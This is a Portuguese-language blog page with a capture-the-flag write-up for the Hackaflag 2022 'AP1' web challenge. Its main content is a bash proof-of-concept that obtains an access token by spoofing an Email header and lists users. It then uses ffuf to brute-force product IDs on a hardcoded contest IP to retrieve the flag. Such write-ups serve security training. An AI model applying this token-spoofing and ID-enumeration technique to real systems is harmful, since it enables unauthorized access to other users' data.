<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Finger+Paint&family=Roboto:wght@100&display=swap" rel="stylesheet">
        <link href="/fonts/meslo.ttf" rel="stylesheet">
        <title>Hackaflag CTF 2022 - Desafio AP1 da etapa 1</title>        
    <link rel="stylesheet" href="/assets/404.b2188d1d.css" /></head>

    <body class="
        bg-[#3a3e4a]
        font-meslo
        pb-5

        flex
        flex-col

        pt-[2vh]
        pr-[25vh]
        pl-[25vh]
        gap-5
    ">
      <div class="
        flex 
        flex-row 
        truncate
        gap-5
      ">
        <div class="
          flex
          border-dashed
          border-2
          border-gray-500
          rounded-lg
        ">
          <div class="
	bg-[#464b59]
	rounded-lg
	text-white
	p-5
">
	<div class="
    p-4
    font-bold
    text-3xl
    text-center
    hover:animate-waving-hand
">
    <button onclick="
        (document.referrer.includes(document.location.host)
        && document.location.origin + '/' == document.referer
        )
        ? window.history.back()
        : window.location.href = '/'
    ">üëà</button>
</div>
</div>
        </div>
        <div class="
          rounded-lg
          shrink grow
          border-dashed
          border-2
          border-gray-500
        ">
          <div class="
	bg-[#464b59]
	rounded-lg
	text-white
	p-5
">
	<div class="
	p-2
	font-navpost
	text-center
  text-yellow-300
	text-3xl
">
	<a href="hackaflag-2022-etapa1">
		Hackaflag CTF 2022 - Desafio AP1 da etapa 1
	</a>
</div>

<p class="
	font-sans
	text-center
  text-gray-300
	italic 
	hover:not-italic">
	Reading time: 2 minutes
</p>
</div>
        </div>
      </div>

    <div class="
      bg-[#434854]
      rounded-lg
      text-gray-300
      tracking-wider
      px-8

      cursor-auto

      border-dashed
      border-2
      border-gray-500
      
      min-w-full
      static
      gap-1
      leading-7

      prose
      prose-headings:text-yellow-400
      prose-em:text-yellow-400

      prose-a:text-yellow-400 
      hover:prose-a:text-yellow-600
      prose-a:cursor-pointer

      prose-code:text-yellow-400
      prose-code:before:content-['']
      prose-code:after:content-['']

      prose-strong:text-yellow-400
      
      prose-img:rounded-xl
      prose-img:min-w-full

      prose-img:outline
      prose-img:outline-offset-2 
      prose-img:outline-4

      prose-pre:outline
      prose-pre:outline-offset-2 
      prose-pre:outline-4

      text-lg
      text-justify
      prose-h1:before:content-['#_']
      prose-h2:before:content-['#_']
      prose-h3:before:content-['#_']
      prose-h4:before:content-['#_']
      prose-h5:before:content-['#_']
      
      prose-h1:text-2xl
      prose-h2:text-xl
      prose-h3:text-xl
      prose-h4:text-xl
      prose-h5:text-xl
      
      prose-h1:leading-8
      prose-h2:leading-8
      prose-h3:leading-8
      prose-h4:leading-8
      prose-h5:leading-8
      
      prose-h1:font-navpost
      prose-h2:font-navpost
      prose-h3:font-navpost
      prose-h4:font-navpost
      prose-h5:font-navpost

      list-inside
      marker:text-yellow-400
    " id="post">
      <div class="
          prose-img:border-4
          prose-img:border-gray-500
        ">
          <img src="/images/hackaflag-2022-etapa1.png">
        </div>
      <h2 id="introdu√ß√£o">Introdu√ß√£o</h2>
<p>[pt-BR]</p>
<p>No per√≠odo entre 07/04/22 a 10/04/22, aconteceu a primeira etapa do Hackaflag CTF. Neste ano, os desafios passaram a ser baseados em falhas j√° relatadas atrav√©s de programas de <a href="https://pt.wikipedia.org/wiki/Bug_bounty" target="_blank" rel="noopener noreferrer">bug bounty</a>, o que pode mudar um pouco a abordagem para conseguir resolver os desafios.</p>
<p>Contudo, na prova de conceito e no v√≠deo a seguir, √© apresentada uma poss√≠vel solu√ß√£o para o desafio <a href="https://hackaflag.com.br/ctf/flag.php?id=40#WEB240" target="_blank" rel="noopener noreferrer">AP1</a> desta primeira etapa.</p>
<h2 id="prova-de-conceito">Prova de conceito</h2>
<p><strong>Notas</strong>:</p>
<ul>
<li>A execu√ß√£o do c√≥digo abaixo requer o <a href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener noreferrer">ffuf</a> instalado;</li>
<li>O c√≥digo tamb√©m pode ser visto no <a href="https://github.com/EffectRenan/CTF/tree/hackaflag_2022_1" target="_blank" rel="noopener noreferrer">Github</a>.</li>
</ul>
<ol>
<li>Salve o conte√∫do abaixo em um arquivo shell script: <code>poc.sh</code>.</li>
<li>D√™ permiss√£o de execu√ß√£o para esse arquivo criado: <code>chmod +x poc.sh</code>.</li>
<li>Execute-o: <code>./poc.sh</code></li>
</ol>
<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #88846F">#!/bin/bash</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">HTTP_EMAIL=</span><span style="color: #E6DB74">"test@test.com"</span></span>
<span class="line"><span style="color: #F8F8F2">WORDLIST=</span><span style="color: #E6DB74">"ids_hackaflag.txt"</span></span>
<span class="line"><span style="color: #F8F8F2">WORDLIST_LIMIT=4000</span></span>
<span class="line"><span style="color: #F8F8F2">HTTP_TOKEN=</span><span style="color: #E6DB74">""</span></span>
<span class="line"></span>
<span class="line"><span style="color: #A6E22E">get_token</span><span style="color: #F8F8F2">() {</span></span>
<span class="line"><span style="color: #F8F8F2">  curl -s http://157.245.74.188/logar/ -H </span><span style="color: #E6DB74">"Email: </span><span style="color: #F8F8F2">$HTTP_EMAIL</span><span style="color: #E6DB74">"</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">|</span><span style="color: #F8F8F2"> cut -d </span><span style="color: #E6DB74">'>'</span><span style="color: #F8F8F2"> -f3</span></span>
<span class="line"><span style="color: #F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #A6E22E">list</span><span style="color: #F8F8F2">() {</span></span>
<span class="line"><span style="color: #F8F8F2">  curl -s http://157.245.74.188/list/ -H </span><span style="color: #E6DB74">"Token: </span><span style="color: #F8F8F2">$HTTP_TOKEN</span><span style="color: #E6DB74">"</span></span>
<span class="line"><span style="color: #F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #A6E22E">status</span><span style="color: #F8F8F2">() {</span></span>
<span class="line"><span style="color: #F8F8F2">  curl -s http://157.245.74.188/status/ -H </span><span style="color: #E6DB74">"Token: </span><span style="color: #F8F8F2">$HTTP_TOKEN</span><span style="color: #E6DB74">"</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">|</span><span style="color: #F8F8F2"> grep </span><span style="color: #E6DB74">"desafio"</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">|</span><span style="color: #F8F8F2"> cut -d </span><span style="color: #E6DB74">'>'</span><span style="color: #F8F8F2"> -f5 </span><span style="color: #F92672">|</span><span style="color: #F8F8F2"> cut -d </span><span style="color: #E6DB74">'&#x3C;'</span><span style="color: #F8F8F2"> -f1</span></span>
<span class="line"><span style="color: #F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #A6E22E">create_wordlist</span><span style="color: #F8F8F2">() {</span></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">></span><span style="color: #F8F8F2"> $WORDLIST</span></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">for</span><span style="color: #F8F8F2"> i </span><span style="color: #F92672">in</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">$(seq 1 </span><span style="color: #F8F8F2">$WORDLIST_LIMIT</span><span style="color: #E6DB74">)</span><span style="color: #F92672">;</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">do</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> $i </span><span style="color: #F92672">>></span><span style="color: #F8F8F2"> $WORDLIST</span><span style="color: #F92672">;</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">done</span></span>
<span class="line"><span style="color: #F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #A6E22E">bruteforce_id</span><span style="color: #F8F8F2">() {</span></span>
<span class="line"><span style="color: #F8F8F2">  create_wordlist</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">  ffuf -s -w ./$WORDLIST -u http://157.245.74.188/products/</span><span style="color: #F92672">?</span><span style="color: #F8F8F2">id=FUZZ -H </span><span style="color: #E6DB74">"Token: </span><span style="color: #F8F8F2">$HTTP_TOKEN</span><span style="color: #E6DB74">"</span><span style="color: #F8F8F2"> -fs </span><span style="color: #E6DB74">"50"</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">  rm $WORDLIST</span></span>
<span class="line"><span style="color: #F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #A6E22E">users</span><span style="color: #F8F8F2">() {</span></span>
<span class="line"><span style="color: #F8F8F2">  curl -s http://157.245.74.188/users/ -H </span><span style="color: #E6DB74">"Token: </span><span style="color: #F8F8F2">$HTTP_TOKEN</span><span style="color: #E6DB74">"</span></span>
<span class="line"><span style="color: #F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #A6E22E">flag</span><span style="color: #F8F8F2">() {</span></span>
<span class="line"><span style="color: #F8F8F2">  curl -s http://157.245.74.188/products/</span><span style="color: #F92672">?</span><span style="color: #F8F8F2">id=$1 -H </span><span style="color: #E6DB74">"Token: </span><span style="color: #F8F8F2">$HTTP_TOKEN</span><span style="color: #E6DB74">"</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">|</span><span style="color: #F8F8F2"> cut -d </span><span style="color: #E6DB74">' '</span><span style="color: #F8F8F2"> -f2</span></span>
<span class="line"><span style="color: #F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">HTTP_TOKEN=</span><span style="color: #E6DB74">$(get_token)</span></span>
<span class="line"><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"Token (</span><span style="color: #F8F8F2">$HTTP_EMAIL</span><span style="color: #E6DB74">):"</span></span>
<span class="line"><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> $HTTP_TOKEN</span></span>
<span class="line"></span>
<span class="line"><span style="color: #66D9EF">echo</span></span>
<span class="line"></span>
<span class="line"><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"List:"</span></span>
<span class="line"><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">$(list)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #66D9EF">echo</span></span>
<span class="line"></span>
<span class="line"><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"Status:"</span></span>
<span class="line"><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">$(status)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #66D9EF">echo</span></span>
<span class="line"></span>
<span class="line"><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"Users:"</span></span>
<span class="line"><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">$(users)</span><span style="color: #F8F8F2"> </span></span>
<span class="line"></span>
<span class="line"><span style="color: #66D9EF">echo</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">HTTP_EMAIL=</span><span style="color: #E6DB74">"leet@localhost.com"</span></span>
<span class="line"><span style="color: #F8F8F2">HTTP_TOKEN=</span><span style="color: #E6DB74">$(get_token)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"Token (</span><span style="color: #F8F8F2">$HTTP_EMAIL</span><span style="color: #E6DB74">):"</span></span>
<span class="line"><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> $HTTP_TOKEN</span></span>
<span class="line"></span>
<span class="line"><span style="color: #66D9EF">echo</span></span>
<span class="line"></span>
<span class="line"><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> -n </span><span style="color: #E6DB74">"Brute-force ID (1 .. </span><span style="color: #F8F8F2">$WORDLIST_LIMIT</span><span style="color: #E6DB74">):"</span></span>
<span class="line"><span style="color: #F8F8F2">ID=</span><span style="color: #E6DB74">$(bruteforce_id)</span></span>
<span class="line"><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> $ID</span></span>
<span class="line"></span>
<span class="line"><span style="color: #66D9EF">echo</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">FLAG=</span><span style="color: #E6DB74">$(flag </span><span style="color: #F8F8F2">$ID</span><span style="color: #E6DB74">)</span></span>
<span class="line"><span style="color: #F8F8F2">  </span></span>
<span class="line"><span style="color: #F92672">if</span><span style="color: #F8F8F2"> [[ </span><span style="color: #E6DB74">$(echo </span><span style="color: #F8F8F2">$FLAG</span><span style="color: #E6DB74"> </span><span style="color: #F92672">|</span><span style="color: #E6DB74"> grep 'HACKAFLAG{')</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">!=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">''</span><span style="color: #F8F8F2"> ]]</span><span style="color: #F92672">;</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">then</span></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"Flag:"</span></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> $FLAG</span></span>
<span class="line"><span style="color: #F92672">else</span></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"Flag not found"</span></span>
<span class="line"><span style="color: #F92672">fi</span></span></code></pre>
<h2 id="v√≠deo">V√≠deo</h2>
<p>Live gravada no dia 15/04/2022 no <a href="https://www.twitch.tv/hackaflag" target="_blank" rel="noopener noreferrer">canal do Hackaflag na Twitch</a>.</p>
<div style="padding-bottom: 56.25%; position: relative;"><iframe width="100%" height="100%" src="https://player.twitch.tv/?autoplay=false&#x26;parent=blog.effectrenan.com&#x26;time=0h37m42s&#x26;video=1457209414" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture; fullscreen" style="position: absolute; top: 0px; left: 0px; width: 100%; height: 100%;">&#x3C;small>Twitch embedding powered by &#x3C;a href="https://embed.tube">embed.tube&#x3C;/a>&#x3C;/small></iframe></div> 
    </div>
  </body></html>